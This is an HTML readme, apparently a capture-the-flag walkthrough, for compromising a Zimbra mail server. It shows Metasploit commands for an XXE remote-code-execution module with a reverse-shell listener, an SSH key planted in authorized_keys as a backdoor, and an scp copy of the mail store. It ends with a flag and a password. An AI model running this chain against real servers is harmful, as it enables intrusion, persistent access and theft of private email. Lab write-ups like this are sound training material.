@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang xml:lang>
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <title>Readme</title>
+  <style>
+    code{white-space: pre-wrap;}
+    span.smallcaps{font-variant: small-caps;}
+    span.underline{text-decoration: underline;}
+    div.column{display: inline-block; vertical-align: top; width: 50%;}
+    div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
+    ul.task-list{list-style: none;}
+  </style>
+  <style type="text/css">body {
+font-family: Arial, sans-serif;
+line-height: 1.6;
+background-color: #121212;
+color: #e0e0e0;
+padding: 20px;
+}
+h1, h2, h3, h4, h5, h6 {
+color: #ff9800; 
+}
+code {
+background-color: #333;
+padding: 2px 4px;
+border-radius: 4px;
+font-family: 'Courier New', Courier, monospace;
+color: #ff5722; 
+}
+pre {
+background-color: #333;
+padding: 10px;
+border-radius: 4px;
+overflow-x: auto;
+color: #ff5722; 
+}
+a {
+color: #bb86fc;
+text-decoration: none;
+}
+a:hover {
+text-decoration: underline;
+}
+ul {
+margin: 20px 0;
+padding: 0 20px;
+border-left: 2px solid #ff9800; 
+}
+li {
+margin: 10px 0;
+}
+strong {
+color: #ff9800; 
+}
+</style>
+</head>
+<body>
+<h1 id="mail-server">Mail Server</h1>
+<ol type="1">
+<li><p><strong>Address:</strong> <code>172.16.3.67</code></p></li>
+<li><p><strong>Find vulnerability:</strong> <a href="https://www.exploit-db.com/exploits/46693">Exploit-DB</a></p></li>
+<li><p><strong>Run Metasploit:</strong></p>
+<pre class="shell"><code>msfconsole -q
+use exploit/linux/http/zimbra_xxe_rce
+set RHOST 172.16.3.67
+set RPORT 443
+set LHOST 10.8.0.29
+set LPORT 4747
+
+# -j will run it as a JOB
+run</code></pre>
+<blockquote>
+<p><strong>Attention:</strong> Password: <code>Zimbra2024</code></p>
+</blockquote></li>
+<li><p><strong>Check SSH Keys (Create One, if needed):</strong></p>
+<pre class="shell"><code>cat ./id_ed25519.pub
+
+# Create If You Don&#39;t Have one
+ssh-keygen -t ed25519 -f ./id_ed25519 -N &quot;&quot;</code></pre></li>
+<li><p><strong>Set public Key:</strong></p>
+<pre class="shell"><code>echo &quot;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOCswCp0rS8p6Ost8dvKK7ZQHrrgfEYo1JM1cEroUnY4 danial@pop-os&quot; &gt; ~/.ssh/authorized_keys</code></pre></li>
+<li><p><strong>SSH into Server:</strong></p>
+<pre class="shell"><code>ssh -i ./id_ed25519 zimbra@172.16.3.67 -p 2200</code></pre></li>
+<li><p><strong>Download Zimbra Data:</strong></p>
+<pre class="shell"><code>scp -P 2200 -i ./id_ed25519 -r zimbra@172.16.3.67:/opt/zimbra/store/0 ./08-store0</code></pre></li>
+<li><p><strong>Check Emails and Decode Files:</strong> <a href="https://gchq.github.io/CyberChef/">CyberChef</a></p></li>
+<li><p><strong>Flag:</strong> <code>MAZAPA_f7fcfe674431022cab7ae571058b1327</code></p></li>
+</ol>
+</body>
+</html>
